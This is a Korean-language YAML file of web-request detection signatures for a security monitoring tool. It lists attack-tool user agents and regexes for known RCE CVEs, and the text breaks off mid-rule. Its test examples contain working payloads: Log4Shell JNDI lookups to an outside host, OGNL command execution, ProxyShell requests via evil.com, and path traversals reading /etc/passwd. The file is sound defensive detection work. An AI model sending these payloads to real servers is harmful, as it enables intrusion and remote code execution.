# SAW 기본 탐지 묶음 — 웹 요청 시그니처 (웹 서버 로그 · WAF 로그 · NDR 요청 기록 · 패킷 속 HTTP 공통)
#
# 한 줄의 요청만 보고 알 수 있는 "알려진 흔적"을 모은 목록입니다. 행동(횟수·순서)을 봐야 하는 탐지는 코드 탐지기가 맡습니다.
#
# 쓰는 법 (AI 없이도 추가할 수 있게 단순하게 만들었습니다)
#   groups:      같은 성격의 규칙 묶음. 단계·위험도·설명·권고를 묶음에 한 번만 적습니다.
#   where:       어디를 볼지  ua(User-Agent) | path(경로) | query(물음표 뒤) | uri(경로+쿼리) | referer | upload(올린 파일 이름) | any(uri+ua+referer)
#   match:       이 글자 중 하나라도 들어 있으면 일치 (소문자로 적습니다. 요청은 URL 디코딩 2회 + 소문자로 바꾼 뒤 비교합니다)
#   all:         적은 글자가 모두 들어 있어야 일치
#   regex:       정규식 (소문자·디코딩된 글자에 대해 검사)
#   method:      이 HTTP 메서드일 때만
#   examples:    반드시 일치해야 하는 예 (자동 시험에 쓰입니다)   benign: 일치하면 안 되는 예
#   success:     matters(기본) = 성공 응답(2xx)이 있으면 위험도를 올리고 따로 보여 줌 | ignore = 응답과 무관 | only = 성공 응답이 있을 때만 탐지
# 규칙 id는 "묶음id.규칙id"가 됩니다. id는 바꾸지 마세요(분석가 평가·끄기 설정이 id에 묶입니다).
version: 1

groups:
  # ------------------------------------------------------------------ 공격·점검 도구
  - id: tool
    title: 공격·취약점 점검 도구 접속
    stage: RECON
    severity: 0.5
    confidence: high
    attack: [T1595.002]
    success: ignore
    where: ua
    explain: 취약점 점검이나 공격에 쓰이는 자동화 도구가 스스로 밝힌 이름(User-Agent)으로 접속했습니다. 도구 이름은 쉽게 바꿀 수 있으므로, 이름이 없다고 안전한 것은 아닙니다.
    checks:
      - 사내에서 승인한 취약점 점검 일정·출발지인지 확인
      - 같은 출발지의 다른 요청 중 성공 응답(2xx)을 받은 것이 있는지 확인
      - 승인되지 않은 출발지면 차단 검토
    rules:
      - {id: sqlmap, title: sqlmap (SQL 주입 자동화), match: [sqlmap], examples: ['sqlmap/1.7.2#stable (https://sqlmap.org)']}
      - {id: nikto, title: Nikto (웹 서버 취약점 점검), match: [nikto], examples: ['Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)']}
      - {id: nmap, title: Nmap 스크립트 엔진, match: ['nmap scripting engine', 'nmap nse'], examples: ['Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)']}
      - {id: nuclei, title: Nuclei (템플릿 기반 취약점 점검), match: [nuclei], examples: ['Nuclei - Open-source project (github.com/projectdiscovery/nuclei)']}
      - {id: masscan, title: masscan (대량 포트 스캔), match: [masscan], examples: ['masscan/1.3 (https://github.com/robertdavidgraham/masscan)']}
      - {id: zgrab, title: zgrab (대량 배너 수집), match: [zgrab], examples: ['Mozilla/5.0 zgrab/0.x']}
      - {id: wpscan, title: WPScan (워드프레스 점검), match: [wpscan], examples: ['WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)']}
      - {id: acunetix, title: Acunetix (상용 웹 취약점 점검), match: [acunetix, 'wvs)'], examples: ['Mozilla/5.0 (compatible; Acunetix-Product)']}
      - {id: nessus, title: Nessus (취약점 점검), match: [nessus], examples: ['Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0) Nessus']}
      - {id: openvas, title: OpenVAS (취약점 점검), match: [openvas], examples: ['Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4)']}
      - {id: qualys, title: Qualys (취약점 점검), match: [qualys], examples: ['Mozilla/5.0 (Qualys WAS)']}
      - {id: netsparker, title: Netsparker·Invicti (웹 취약점 점검), match: [netsparker, invicti], examples: ['Mozilla/5.0 (Netsparker)']}
      - {id: appscan, title: AppScan (웹 취약점 점검), match: [appscan], examples: ['Mozilla/4.0 (compatible; AppScan Standard)']}
      - {id: zap, title: OWASP ZAP (웹 취약점 점검), match: ['owasp zap', 'owasp_zap', zaproxy], examples: ['Mozilla/5.0 (OWASP ZAP 2.14)']}
      - {id: burp, title: Burp Suite (웹 공격·점검 도구), match: [burpsuite, 'burp collaborator', burpcollaborator], examples: ['BurpSuite Professional']}
      - {id: dirbuster, title: DirBuster (경로 무차별 탐색), match: [dirbuster], examples: ['DirBuster-1.0-RC1 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)']}
      - {id: gobuster, title: gobuster (경로 무차별 탐색), match: [gobuster], examples: ['gobuster/3.6']}
      - {id: ffuf, title: ffuf (경로·값 무차별 탐색), match: ['fuzz faster u fool', 'ffuf/'], examples: ['Fuzz Faster U Fool v2.1.0']}
      - {id: feroxbuster, title: feroxbuster (경로 무차별 탐색), match: [feroxbuster], examples: ['feroxbuster/2.10.1']}
      - {id: wfuzz, title: Wfuzz (값 무차별 대입), match: [wfuzz], examples: ['Wfuzz/3.1.0']}
      - {id: dirsearch, title: dirsearch (경로 무차별 탐색), match: [dirsearch], examples: ['dirsearch/0.4.3']}
      - {id: hydra, title: Hydra (로그인 무차별 대입), match: ['(hydra)', 'hydra/'], examples: ['Mozilla/4.0 (Hydra)']}
      - {id: medusa, title: Medusa (로그인 무차별 대입), match: ['medusa v'], examples: ['Teh Forest Lobster (Medusa v2.2)']}
      - {id: whatweb, title: WhatWeb (서버 종류 식별), match: [whatweb], examples: ['WhatWeb/0.5.5']}
      - {id: joomscan, title: JoomScan (Joomla 점검), match: [joomscan], examples: ['Mozilla/5.0 (compatible; OWASP JoomScan)']}
      - {id: arachni, title: Arachni (웹 취약점 점검), match: [arachni], examples: ['Arachni/v1.6.1.3']}
      - {id: w3af, title: w3af (웹 취약점 점검), match: [w3af], examples: ['w3af.org']}
      - {id: havij, title: Havij (SQL 주입 도구), match: [havij], examples: ['Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij']}
      - {id: commix, title: commix (명령 주입 자동화), match: [commix], examples: ['commix/v3.9-stable (https://commixproject.com)']}
      - {id: xsstrike, title: XSS 자동화 도구 (XSStrike·dalfox), match: [xsstrike, dalfox], examples: ['Dalfox/2.9']}
      - {id: jaeles, title: Jaeles (취약점 점검), match: [jaeles], examples: ['Jaeles - The Swiss Army knife for automated Web Application Testing']}
      - {id: metasploit, title: Metasploit 기본 표시, match: [metasploit, 'msf/'], examples: ['Mozilla/5.0 (compatible; Metasploit)']}
      - {id: antsword, title: AntSword (웹셸 관리 도구), match: [antsword], severity: 0.85, examples: ['antSword/v2.1']}
      - {id: python_exploit, title: 공격 스크립트 기본 표시 (pocsuite·xray 등), match: [pocsuite, 'xray/', 'fscan', 'goby'], examples: ['pocsuite3']}

  - id: scanner
    title: 인터넷 전체를 훑는 수집 서비스 접속
    stage: RECON
    severity: 0.25
    confidence: high
    attack: [T1595.001]
    success: ignore
    where: ua
    explain: 인터넷에 열린 서버를 주기적으로 훑어 목록을 만드는 서비스의 접속입니다. 공격은 아니지만, 이 서버가 외부에서 보이고 있고 수집 목록에 올라간다는 뜻입니다.
    checks:
      - 이 서버·포트가 인터넷에 열려 있어야 하는 것인지 확인
      - 수집 서비스에 보이면 안 되는 관리 화면·버전 정보가 노출되는지 확인
    rules:
      - {id: censys, title: Censys, match: [censys], examples: ['Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)']}
      - {id: shodan, title: Shodan, match: [shodan], examples: ['Mozilla/5.0 (compatible; Shodan/1.0)']}
      - {id: zmap, title: ZMap 계열, match: [zmap, 'zmeu'], examples: ['ZmEu']}
      - {id: expanse, title: Palo Alto Expanse, match: [expanse], examples: ['Expanse, a Palo Alto Networks company, searches across the global IPv4 space']}
      - {id: internet_measurement, title: 인터넷 측정 서비스 (internet-measurement·netsystemsresearch 등), match: [internet-measurement, netsystemsresearch, 'internetmeasurement', 'onyphe', 'leakix', 'l9explore', 'binaryedge', 'fofa', 'shadowserver', 'rapid7', 'stretchoid', 'criminalip'], examples: ['Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)']}

  # ------------------------------------------------------------------ 원격 코드 실행: 널리 쓰인 취약점
  - id: rce
    title: 널리 알려진 원격 코드 실행 취약점 공격
    stage: EXPLOITATION
    severity: 0.9
    confidence: high
    attack: [T1190]
    where: any
    explain: 공개된 취약점을 노리는 요청입니다. 대상 제품을 쓰지 않거나 패치돼 있으면 실패하지만, 성공하면 서버에서 공격자의 명령이 실행됩니다.
    checks:
      - 대상 서버가 해당 제품·버전을 쓰는지, 패치 여부를 확인
      - 성공 응답(2xx)을 받은 요청이 있으면 그 직후 서버의 프로세스 실행·외부 접속 기록을 확인
      - 같은 출발지의 이후 요청(파일 업로드, 새 경로 접근)을 확인
    rules:
      - id: log4shell
        title: Log4Shell (Log4j, CVE-2021-44228)
        cve: CVE-2021-44228
        regex: '\$\{(?:jndi:|\$\{(?:lower|upper|::-|env:|sys:|date:|base64:)|::-[a-z]\})'
        examples: ['/?x=${jndi:ldap://198.51.100.7/a}', 'Mozilla ${${lower:j}ndi:${lower:r}mi://x}', '/a?b=${${::-j}${::-n}di:dns://x}']
        benign: ['/search?q=${price}', '/api/items?filter=$top']
      - id: spring4shell
        title: Spring4Shell (Spring Framework, CVE-2022-22965)
        cve: CVE-2022-22965
        match: ['class.module.classloader', 'class[module][classloader]']
        examples: ['/app?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x']
      - id: spring_cloud_function
        title: Spring Cloud Function 라우터 접근 가능성 (Possible)
        where: path
        stage: DISCOVERY
        severity: 0.35
        confidence: low
        regex: '^/functionrouter/?$'
        explain: Spring Cloud Function 라우터 경로 요청입니다. 정상 함수 호출도 같은 경로를 쓰며 CVE-2022-22963의 악성 라우팅 표현식은 보통 헤더에 있습니다. 이 규칙은 헤더를 검사하지 않으므로 경로·2xx만으로 취약점 악용이나 명령 실행을 확정하지 않습니다.
        checks:
          - 정상 함수 호출·승인된 점검인지 서비스 담당과 확인
          - 원본 요청의 spring.cloud.function.routing-expression 헤더와 제품 버전·서버 실행 기록을 추가로 확인
          - 응답 코드와 별도로 WAF 차단·제품 오류 기록을 확인
        examples: ['/functionRouter', '/functionRouter/']
        benign: ['/functionRouter-guide', '/docs/functionRouter', '/functionRouter.json']
      - id: spring_gateway
        title: Spring Cloud Gateway 경로 조작 (CVE-2022-22947)
        cve: CVE-2022-22947
        where: path
        match: ['/actuator/gateway/routes', '/actuator/gateway/refresh']
        examples: ['/actuator/gateway/routes/hacktest']
      - id: struts_ognl
        title: Apache Struts2 OGNL 주입
        regex: '(?:%\{|\$\{)\s*\(?\s*#|#_memberaccess|ognlcontext|@ognl\.|#context\[|xwork\.methodaccessor|com\.opensymphony\.xwork2'
        examples: ['/index.action?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()}', '/x.action?a=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}']
        benign: ['/search?q=100%{discount}']
      - id: confluence_ognl
        title: Confluence OGNL 주입 (CVE-2022-26134 · CVE-2021-26084)
        cve: CVE-2022-26134
        regex: '/\$\{.{0,200}(?:runtime|getruntime|nashorn|scriptengine|processbuilder)|/pages/(?:createpage-entervariables|doenterpagevariables)\.action|/template/aui/text-inline\.vm'
        examples: ['/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8"))}/', '/pages/createpage-entervariables.action', '/template/aui/text-inline.vm']
      - id: confluence_setup
        title: Confluence 관리자 생성 우회 (CVE-2023-22515)
        cve: CVE-2023-22515
        match: ['bootstrapstatusprovider.applicationconfig.setupcomplete', '/setup/setupadministrator.action']
        examples: ['/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false']
      - id: exchange_proxyshell
        title: Exchange ProxyShell·ProxyNotShell (CVE-2021-34473 등)
        cve: CVE-2021-34473
        regex: '/autodiscover/autodiscover\.json.{0,200}(?:@|%40).{0,200}(?:/mapi/|/powershell|/ews/|/ecp/)'
        examples: ['/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com', '/autodiscover/autodiscover.json?a@foo.var/powershell/?x=1']
        benign: ['/autodiscover/autodiscover.json?Email=kim@example.com&Protocol=ActiveSync']
      - id: exchange_proxylogon
        title: Exchange ProxyLogon 흔적 (CVE-2021-26855)
        cve: CVE-2021-26855
        where: path
        regex: '^/ecp/[a-z0-9]{1,8}\.(?:js|css|png|gif|jpg|ttf|eot|woff)$|^/owa/auth/[a-z0-9_]{1,12}\.aspx$|^/aspnet_client/.{0,60}\.aspx$'
        examples: ['/ecp/y.js', '/owa/auth/shell.aspx', '/aspnet_client/system_web/aBcD1234.aspx']
        benign: ['/owa/auth/logon.aspx', '/owa/auth/errorfe.aspx', '/ecp/default.aspx']
        regex_not: '^/owa/auth/(?:logon|logoff|errorfe|expiredpassword|signout)\.aspx$'
      - id: citrix_2019_19781
        title: Citrix ADC 경로 우회 (CVE-2019-19781)
        cve: CVE-2019-19781
        where: path
        match: ['/vpn/../vpns/', '/vpns/portal/scripts/newbm.pl', '/vpns/cfg/smb.conf']
        examples: ['/vpn/../vpns/cfg/smb.conf']
      - id: citrix_2023_3519
        title: Citrix ADC 원격 코드 실행 (CVE-2023-3519)
        cve: CVE-2023-3519
        where: path
        match: ['/gwtest/formssso']
        examples: ['/gwtest/formssso?event=start&target=AAAA']
      - id: f5_tmui
        title: F5 BIG-IP 관리 화면 우회 (CVE-2020-5902)
        cve: CVE-2020-5902
        where: path
        regex: '/tmui/login\.jsp/\.\.;/|/hsqldb;|/tmui/locallb/workspace/'
        examples: ['/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd']
      - id: f5_icontrol
        title: F5 BIG-IP iControl 관리 API 접근 가능성 (Possible)
        where: path
        stage: DISCOVERY
        severity: 0.45
        confidence: low
        regex: '^/mgmt/(?:tm/util/bash|shared/authn/login|tm/access/bundle-install-tasks)(?:/[a-z0-9_-]{1,80})?/?$'
        explain: F5 iControl 관리 API 경로 요청입니다. 정상 인증·관리 호출도 같은 경로를 쓰며 CVE-2022-1388 관련 요청은 헤더·인증 상태·본문을 함께 확인해야 합니다. 경로와 2xx만으로 인증 우회·명령 실행을 확정하지 않습니다.
        checks:
          - 승인된 관리자·자동화 출발지인지와 대상 BIG-IP 버전·패치 상태 확인
          - 원본 인증·연결 헤더와 요청 본문의 command·utilCmdArgs, 장비 감사 기록을 추가 확인
          - 실행 결과·설정 변경 및 장비 차단 기록을 별도로 대조
        examples: ['/mgmt/tm/util/bash', '/mgmt/shared/authn/login']
        benign: ['/mgmt/tm/util/bash-guide', '/docs/mgmt/tm/util/bash', '/mgmt/shared/authn/login.bak']
      - id: fortinet_lang
        title: FortiOS SSL VPN 파일 읽기 (CVE-2018-13379)
        cve: CVE-2018-13379
        regex: '/remote/fgt_lang\?lang=.{0,40}\.\./'
        examples: ['/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession']
      - id: fortinet_auth_bypass
        title: FortiOS 관리자 API 접근 가능성 (Possible)
        where: path
        stage: DISCOVERY
        severity: 0.4
        confidence: low
        regex: '^/api/v2/cmdb/system/admin(?:/[a-z0-9_.@-]{1,80})?/?$'
        explain: FortiOS 관리자 설정 API 경로 요청입니다. 정상 계정 조회·설정도 같은 경로를 사용합니다. CVE-2022-40684 관련 여부는 제품 버전·인증과 전달 헤더·관리 감사 기록을 추가로 확인해야 하며 경로 또는 2xx만으로 인증 우회나 계정 변경을 확정하지 않습니다.
        checks:
          - 정상 관리 계정·자동화 작업인지와 FortiOS 버전·패치 상태 확인
          - 원본 인증·전달 헤더와 요청 본문을 제품 관리 감사 기록과 비교
          - 관리자 생성·권한 변경 여부와 WAF 차단 기록을 별도로 확인
        examples: ['/api/v2/cmdb/system/admin/admin', '/api/v2/cmdb/system/admin']
        benign: ['/api/v2/cmdb/system/admin-guide', '/docs/api/v2/cmdb/system/admin', '/api/v2/cmdb/system/admin/admin/profile']
      - id: fortinet_sslvpn
        title: FortiOS SSL VPN 취약 경로 탐색
        where: path
        match: ['/remote/hostcheck_validate', '/remote/logincheck', '/remote/error']
        severity: 0.6
        examples: ['/remote/hostcheck_validate']
      - id: pulse_2019_11510
        title: Pulse Secure 파일 읽기 (CVE-2019-11510)
        cve: CVE-2019-11510
        where: path
